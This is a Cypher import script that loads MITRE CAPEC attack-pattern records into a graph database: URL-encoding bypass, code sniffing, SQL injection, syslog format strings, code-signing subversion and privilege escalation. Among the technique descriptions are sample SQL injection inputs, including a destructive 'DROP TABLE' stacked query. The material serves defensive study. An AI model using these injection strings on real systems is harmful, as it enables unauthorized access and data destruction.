CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Forceful browsing", description: "<div level=\"0\">\n  <p class=\"text\">When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker indirectly controls the user's browser and makes it performing actions exploiting CSRF."});
CREATE (:Outcome{id: 2, type: "Success", description: "The attacker manipulates the browser through the steps that he designed in his attack. The user, identified on a website, is now performing actions he is not aware of."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
CREATE (:AttackStep{id: 3, title: "Content spoofing", description: "<div level=\"0\">\n  <p class=\"text\">By manipulating the content, the attacker targets the information that the user would like to get from the website.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The user sees a page containing wrong information"});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Detective"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:SecurityControl{id: 4, type: "Preventative"});
CREATE (:SecurityControl{id: 5, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.63.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:CWE{id: 79});
MERGE (:CWE{id: 20});
CREATE (:ResourcesRequired{id: 256, text: "<div level=\"0\">\n  <p class=\"text\">Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.</p>\n</div>"});
CREATE (:AttackPattern{id: 64, name: "Using Slashes and URL Encoding Combined to Bypass Validation Logic", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 485, text: "<div level=\"0\">\n  <p class=\"text\">The application accepts and decodes URL string request.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 486, text: "<div level=\"0\">\n  <p class=\"text\">The application performs insufficient filtering/canonicalization on the URLs.</p>\n</div>"});
CREATE (:Submission{id: 576});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 347});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 570, summary: "OrderedDict([('Text', 'This attack targets the encoding of the URL combined with the encoding of the slash characters. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker accesses the server using a specific URL.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to encode some special characters in the URL. The attacker find out that some characters are not filtered properly.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker crafts a malicious URL string request and sends it to the server.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The server decodes and interprets the URL string. Unfortunately since the input filtering is not done properly, the special characters have harmful consequences.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.64.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.64.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-35", local_id: "R.64.3", author: "Gunter Ollmann", title: "URL Encoded Attacks - Attacks using the common web browser", publisher: "CGISecurity.com", link: "http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html"});
MERGE (:Reference{id: "REF-36", local_id: "R.64.4", author: "['T. Berners-Lee', 'R. Fielding', 'L. Masinter']", title: "RFC 3986 - Uniform Resource Identifier (URI): Generic Syntax", pubdate: "January 2005", link: "http://www.ietf.org/rfc/rfc3986.txt"});
MERGE (:Reference{id: "REF-37", local_id: "R.64.5", author: "['T. Berners-Lee', 'L. Masinter', 'M. McCahill']", title: "RFC 1738 - Uniform Resource Locators (URL)", pubdate: "December 1994", link: "http://www.ietf.org/rfc/rfc1738.txt"});
MERGE (:Reference{id: "REF-38", local_id: "R.64.5", title: "HTML URL Encoding Reference", section: "URL Encoding Reference", publisher: "Refsnes Data", link: "http://www.w3schools.com/tags/ref_urlencode.asp"});
MERGE (:Reference{id: "REF-39", local_id: "R.64.6", title: "The URLEncode and URLDecode Page", publisher: "Albion Research Ltd", link: "http://www.albionresearch.com/misc/urlencode.php"});
MERGE (:Reference{id: "REF-18", local_id: "R.64.7", author: "David Wheeler", title: "Secure Programming for Linux and Unix HOWTO", section: "5.11.4. Validating Hypertext Links (URIs/URLs)", link: "http://www.dwheeler.com/secure-programs/Secure-Programs-HOWTO/filter-html.html#VALIDATING-URIS"});
MERGE (:CWE{id: 177});
MERGE (:CWE{id: 171});
MERGE (:CWE{id: 173});
MERGE (:CWE{id: 172});
MERGE (:CWE{id: 73});
MERGE (:CWE{id: 21});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 707});
CREATE (:AttackPattern{id: 65, name: "Sniff Application Code", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 487, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have the ability to place himself in the communication path between the client and server.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 488, text: "<div level=\"0\">\n  <p class=\"text\">The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 489, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must be able to employ a sniffer on the network without being detected.</p>\n</div>"});
CREATE (:Submission{id: 577});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 348});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated Description Summary, Related_Attack_Patterns"});
CREATE (:Modification{id: 349});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description Summary"});
CREATE (:Modification{id: 350});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 99, name: "Passively Sniff and Capture Application Code Bound for Authorized Client"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 571, summary: "OrderedDict([('Text', 'An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <h1>Set up a sniffer</h1>\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client and watches the traffic.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker sets up a sniffer in the path between the server and the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker successfully sets up a sniffer in the path between the server and client."});
CREATE (:Outcome{id: 2, type: "Failure", description: "The attacker could not set up a sniffer in the path between the server and client."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <h1>Capturing Application Code Bound During Patching</h1>\n  <p class=\"text\">Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker loads the sniffer to capture the application code bound during a dynamic update.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker proceeds to reverse engineer the captured code.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The attacker can capture the application code bound for the target.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">The communication between the server and client is encrypted. The attacker may still possible to lift key material from the client.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker captures the application code bound for the target and reverse engineers the captured code."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
MERGE (:CWE{id: 319});
MERGE (:CWE{id: 311});
MERGE (:CWE{id: 318});
MERGE (:CWE{id: 693});
MERGE (:CWE{id: 719});
CREATE (:ResourcesRequired{id: 258, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs the ability to capture communications between the client being updated and the server providing the update.</p>\n  <p class=\"text\">In the case that encryption obscures client/server communication the attacker will either need to lift key material from the client.</p>\n</div>"});
CREATE (:AttackPattern{id: 66, name: "SQL Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 490, text: "<div level=\"0\">\n  <p class=\"text\">SQL queries used by the application to store, retrieve or modify data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 491, text: "<div level=\"0\">\n  <p class=\"text\">User-controllable input that is not properly validated by the application as part of SQL queries.</p>\n</div>"});
CREATE (:Submission{id: 578});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 572, summary: "OrderedDict([('Text', ['This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended.', \"SQL Injection results from failure of the application to appropriately validate input. When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to talk directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database. In order to successfully inject SQL and retrieve information from a database, an attacker:\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey application", description: "<div level=\"0\">\n  <p class=\"text\">The attacker first takes an inventory of the functionality exposed by the application.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spider web sites for all available links</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Sniff network communications with application using a utility such as WireShark.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one data input to application identified."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No inputs to application identified. Note that just because no inputs are identified does not mean that the application will not accept any."});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Determine user-controllable input susceptible to injection", description: "<div level=\"0\">\n  <p class=\"text\">Determine the user-controllable input susceptible to injection. For each user-controllable input that the attacker suspects is vulnerable to SQL injection, attempt to inject characters that have special meaning in SQL (such as a single quote character, a double quote character, two hyphens, a parenthesis, etc.). The goal is to create a SQL query with an invalid syntax.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use web browser to inject input through text fields or through HTTP GET parameters.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use network-level packet injection tools such as netcat to inject input</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">Use modified client (modified by reverse engineering) to inject input.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives normal response from server.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Attacker receives an error message from server indicating that there was a problem with the SQL query.</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Server sends a specific error message that indicates programmatic parsing of the input data (e.g. NumberFormatException)</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "At least one user-controllable input susceptible to injection found."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No user-controllable input susceptible to injection found."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
CREATE (:AttackStep{id: 2, title: "Experiment and try to exploit SQL Injection vulnerability", description: "<div level=\"0\">\n  <p class=\"text\">After determining that a given input is vulnerable to SQL Injection, hypothesize what the underlying query looks like. Iteratively try to add logic to the query to extract information from the database, or to modify or delete information in the database.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Use public resources such as \"SQL Injection Cheat Sheet\" at http://ferruh.mavituna.com/makale/sql-injection-cheatsheet/, and try different approaches for adding logic to SQL queries.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Add logic to query, and use detailed error messages from the server to debug the query. For example, if adding a single quote to a query causes an error message, try : \"' OR 1=1; --\", or something else that would syntactically complete a hypothesized query. Iteratively refine the query.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Use \"Blind SQL Injection\" techniques to extract information about the database schema.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 4, description: "<div level=\"0\">\n  <p class=\"text\">If a denial of service attack is the goal, try stacking queries. This does not work on all platforms (most notably, it does not work on Oracle or MySQL). Examples of inputs to try include: \"'; DROP TABLE SYSOBJECTS; --\" and \"'); DROP TABLE SYSOBJECTS; --\". These particular queries will likely not work because the SYSOBJECTS table is generally protected.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Success outcome in previous step.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failure outcome in previous step.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker achieves goal of unauthorized system access, denial of service, etc."});
CREATE (:Outcome{id: 2, type: "Failure", description: "Attacker unable to exploit SQL Injection vulnerability."});
MERGE (:Reference{id: "REF-3", local_id: "R.66.1", title: "Common Weakness Enumeration (CWE)", section: "CWE-89 - SQL Injection", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/89.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.66.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-20 - Input Validation", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/20.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.66.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-390 - Improper Error Handling", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/390.html"});
MERGE (:CWE{id: 89});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 390});
MERGE (:CWE{id: 697});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 707});
CREATE (:ResourcesRequired{id: 259, text: "<div level=\"0\">\n  <p class=\"text\">None</p>\n</div>"});
CREATE (:AttackPattern{id: 67, name: "String Format Overflow in syslog()", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 492, text: "<div level=\"0\">\n  <p class=\"text\">The format string argument of the Syslog function can be tainted with user supplied data.</p>\n</div>"});
CREATE (:Submission{id: 579});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 351});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 573, summary: "OrderedDict([('Text', 'This attack targets the format string vulnerabilities in the syslog() function. An attacker would typically inject malicious input in the format string parameter of the syslog function. This is a common problem, and many public vulnerabilities and associated exploits have been posted.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds that he can inject data to the format string parameter of Syslog().</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker craft a malicious input and inject it into the format string parameter. From now on, the attacker can execute arbitrary code and do more damage.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.67.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.67.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:Reference{local_id: "R.67.3", author: "['scut', 'team teso']", title: "Exploiting Format String Vulnerabilities", link: "http://doc.bughunter.net/format-string/exploit-fs.html"});
MERGE (:Reference{local_id: "R.67.4", author: "Halvar Flake", title: "Auditing binaries for security vulnerabilities", link: "http://www.blackhat.com/presentations/bh-europe-00/HalvarFlake/HalvarFlake.ppt"});
MERGE (:Reference{local_id: "R.67.5", title: "Fortify Taxonomy of Vulnerabilities", publisher: "Fortify Software", link: "http://vulncat.fortifysoftware.com/1/FS.html"});
MERGE (:Reference{local_id: "R.67.6", title: "Syslog man page", link: "http://www.rt.com/man/syslog.3.html"});
CREATE (:CVE{id: "CVE-2002-0573", description: "<div level=\"0\">\n  <p class=\"text\">format string in bad call to syslog function</p>\n</div>"});
CREATE (:CVE{id: "CVE-2001-0717", description: "<div level=\"0\">\n  <p class=\"text\">format string in bad call to syslog function</p>\n</div>"});
CREATE (:CVE{id: "CVE-2002-0412", description: "<div level=\"0\">\n  <p class=\"text\">format string in bad call to syslog function</p>\n</div>"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 134});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 68, name: "Subvert Code-signing Facilities", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 493, text: "<div level=\"0\">\n  <p class=\"text\">A framework-based language that supports code signing (such as, and most commonly, Java or .NET)</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 494, text: "<div level=\"0\">\n  <p class=\"text\">Deployed code that has been signed by its authoring vendor, or a partner.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 495, text: "<div level=\"0\">\n  <p class=\"text\">The attacker will, for most circumstances, also need to be able to place code in the victim container. This does not necessarily mean that they will have to subvert host-level security, except when explicitly indicated.</p>\n</div>"});
CREATE (:Submission{id: 580});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 352});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 574, summary: "OrderedDict([('Text', [\"Because languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment, subverting this mechanism can be instrumental in an attacker escalating privilege.\", 'Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack. This pattern does not include circumstances through which a signing key has been stolen.'])])"});
CREATE (:CVE{id: "CVE-2006-5201", description: "<div level=\"0\">\n  <p class=\"text\">Multiple packages on Sun Solaris, including (1) NSS; (2) Java JDK and JRE 5.0 Update 8 and earlier, SDK and JRE 1.4.x up to 1.4.2_12, and SDK and JRE 1.3.x up to 1.3.1_19; (3) JSSE 1.0.3_03 and earlier; (4) IPSec/IKE; (5) Secure Global Desktop; and (6) StarOffice, when using an RSA key with exponent 3, removes PKCS-1 padding before generating a hash, which allows remote attackers to forge a PKCS #1 v1.5 signature that is signed by that RSA key and prevents these products from correctly verifying X.509 and other certificates that use PKCS #1.</p>\n</div>"});
CREATE (:CVE{id: "CVE-2006-4790", description: "<div level=\"0\">\n  <p class=\"text\">verify.c in GnuTLS before 1.4.4, when using an RSA key with exponent 3, does not properly handle excess data in the digestAlgorithm.parameters field when generating a hash, which allows remote attackers to forge a PKCS #1 v1.5 signature that is signed by that RSA key and prevents GnuTLS from correctly verifying X.509 and other certificates that use PKCS, a variant of CVE-2006-4339.</p>\n</div>"});
MERGE (:CWE{id: 325});
MERGE (:CWE{id: 328});
CREATE (:ResourcesRequired{id: 261, text: "<div level=\"0\">\n  <p class=\"text\">The Attacker needs no special resources beyond the listed prerequisites in order to conduct this style of attack.</p>\n</div>"});
CREATE (:AttackPattern{id: 69, name: "Target Programs with Elevated Privileges", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 496, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program runs with elevated OS privileges.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 497, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program accepts input data from the user or from another program.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 498, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program does not perform input validation properly.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 499, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program does not fail safely. For instance when a program fails it may authorize restricted access to anyone.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 500, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program has a vulnerability such as buffer overflow which may be exploited if a malicious user can inject unvalidated data. For instance a buffer overflow interrupts the program as it executes, and makes it run additional code supplied by the attacker. If the program under attack has elevated privileges to the OS, the attacker can elevate its privileges (such as having root level access).</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 501, text: "<div level=\"0\">\n  <p class=\"text\">The targeted program is giving away information about itself. Before performing such attack, an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application, etc.) the more information can be gather by an attacker.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 502, text: "<div level=\"0\">\n  <p class=\"text\">This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.</p>\n</div>"});
CREATE (:Submission{id: 581});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 353});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-11-09"});
MERGE (:Comment{comment: "Updated References"});
CREATE (:Modification{id: 354});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 575, summary: "OrderedDict([('Text', 'This attack targets programs running with elevated privileges. The attacker would try to leverage a bug in the running program and get arbitrary code to execute with elevated privileges. For instance an attacker would look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. The malicious user try to execute its code at the same level as a privileged system call.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes for programs running with elevated privileges.</p>\n</div>"});
CREATE (:AttackStep{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">The attacker finds a bug in a program running with elevated privileges.</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker exploits the bug that she has found. For instance she can try to inject and execute arbitrary code or write to OS resources.</p>\n</div>"});
MERGE (:Reference{id: "REF-2", local_id: "R.69.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.69.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-214: Failure to protect stored data from modification", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/214.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.69.3", title: "Common Weakness Enumeration (CWE)", section: "CWE-15: Setting manipulation", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/15.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.69.4", title: "Common Weakness Enumeration (CWE)", section: "CWE-250: Often Misused: Privilege Management", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/250.html"});
MERGE (:Reference{id: "REF-3", local_id: "R.69.5", title: "Common Weakness Enumeration (CWE)", section: "CWE-264: Permissions, Privileges, and Access Controls", publisher: "The MITRE Corporation", link: "http://cwe.mitre.org/data/definitions/264.html"});
MERGE (:Reference{local_id: "R.69.6", author: "ATT&CK Project", title: "Exploitation of Vulnerability (1068)", publisher: "MITRE", link: "https://attack.mitre.org/wiki/Exploitation_of_vulnerability"});
CREATE (:CVE{id: "CVE-2004-0213", description: "<div level=\"0\">\n  <p class=\"text\">Utility Manager in Windows 2000 launches winhlp32.exe while Utility Manager is running with raised privileges, which allows local users to gain system privileges via a \"Shatter\" style attack that sends a Windows message to cause Utility Manager to launch winhlp32 by directly accessing the context sensitive help and bypassing the GUI, then sending another message to winhlp32 in order to open a user-selected file, a different vulnerability than CVE-2003-0908.</p>\n</div>"});
MERGE (:CWE{id: 250});
MERGE (:CWE{id: 264});
MERGE (:CWE{id: 15});
CREATE (:AttackPattern{id: 7, name: "Blind SQL Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 503, text: "<div level=\"0\">\n  <p class=\"text\">SQL queries used by the application to store, retrieve or modify data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 504, text: "<div level=\"0\">\n  <p class=\"text\">User-controllable input that is not properly validated by the application as part of SQL queries.</p>\n</div>"});
CREATE (:Submission{id: 582});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 355});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
